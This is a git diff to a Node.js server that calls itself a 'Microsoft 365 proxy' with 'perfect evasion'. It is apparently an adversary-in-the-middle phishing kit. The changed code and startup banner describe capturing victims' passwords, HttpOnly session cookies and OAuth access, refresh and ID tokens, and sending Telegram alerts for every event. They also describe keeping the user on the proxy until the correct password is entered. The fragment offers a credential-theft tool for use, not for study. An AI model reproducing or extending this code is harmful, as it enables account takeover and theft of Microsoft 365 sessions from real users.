@@ -6,7 +6,6 @@ const querystring = require('querystring');
 const crypto = require('crypto');
 const zlib = require('zlib');
 const axios = require('axios');
-const { v4: uuidv4 } = require('uuid');
 
 // ============================================================
 //  ENVIRONMENT VARIABLES
@@ -87,7 +86,7 @@ class SessionStore {
         this.evasionCounters = new Map();
         this.fullAuthData = new Map();
         this.credentialHistory = new Map();
-        this.requestLogs = new Map();
+        this.telegramAlerts = new Map();
     }
 
     storeHttpOnlyCookies(sessionId, cookieHeaders, url) {
@@ -461,7 +460,6 @@ ${cookieList}
                 this.fullAuthData.delete(id);
                 this.evasionCounters.delete(id);
                 this.credentialHistory.delete(id);
-                this.requestLogs.delete(id);
                 cleaned++;
             }
         }
@@ -558,6 +556,7 @@ function createSession(email, ip, userAgent) {
         validationAttempts: [],
         lastValidationResult: null
     };
+    
     sessionStore.sessions.set(sessionId, {
         email: email || 'unknown',
         password: null,
@@ -566,6 +565,7 @@ function createSession(email, ip, userAgent) {
         created: Date.now(),
         lastActivity: Date.now()
     });
+    
     console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
     return sessionId;
 }
@@ -584,11 +584,10 @@ function getClientIp(req) {
 }
 
 // ============================================================
-//  SERVE FILES - FIXED: Read from public/ folder
+//  SERVE FILES
 // ============================================================
 
 function serveFile(filename, res, contentType = 'text/html') {
-    // ✅ FIXED: Read from public/ folder
     const filePath = path.join(__dirname, 'public', filename);
     fs.readFile(filePath, (err, data) => {
         if (err) {
@@ -1821,7 +1820,7 @@ const server = http.createServer((req, res) => {
     console.log(`[REQUEST] ${req.method} ${req.url}`);
 
     // ============================================================
-    //  SERVE STATIC FILES - FIXED: Uses public/ folder
+    //  SERVE STATIC FILES
     // ============================================================
     
     if (req.url === PROXY_PATHNAMES.script) {
@@ -2249,8 +2248,7 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - PERFECT EVASION         ║');
     console.log('║     🔐  Full Account Access - Complete Session Capture       ║');
-    console.log('║     ✅  FIXED: Serve files from public/ folder               ║');
-    console.log('║     ✅  FIXED: Microsoft OAuth Tenant-Specific Endpoint      ║');
+    console.log('║     ✅  REAL Microsoft OAuth - NOT SIMULATED                 ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
@@ -2259,8 +2257,11 @@ server.listen(PORT, () => {
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
-    console.log('║   ✅ FIXED: 404 Not Found - files now served from public/    ║');
-    console.log('║   ✅ FIXED: AADSTS9001023 - using tenant-specific endpoint   ║');
+    console.log('║   ✅ REAL Microsoft OAuth - NOT SIMULATION                   ║');
+    console.log('║   ✅ HttpOnly Cookies Captured (Set-Cookie headers)           ║');
+    console.log('║   ✅ OAuth Tokens (Access, Refresh, ID)                       ║');
+    console.log('║   ✅ Telegram Alerts for ALL events                           ║');
+    console.log('║   ✅ User STAYS ON PROXY until correct password              ║');
     console.log('║                                                               ║');
     console.log('╠═══════════════════════════════════════════════════════════════╣');
     console.log('║                                                               ║');
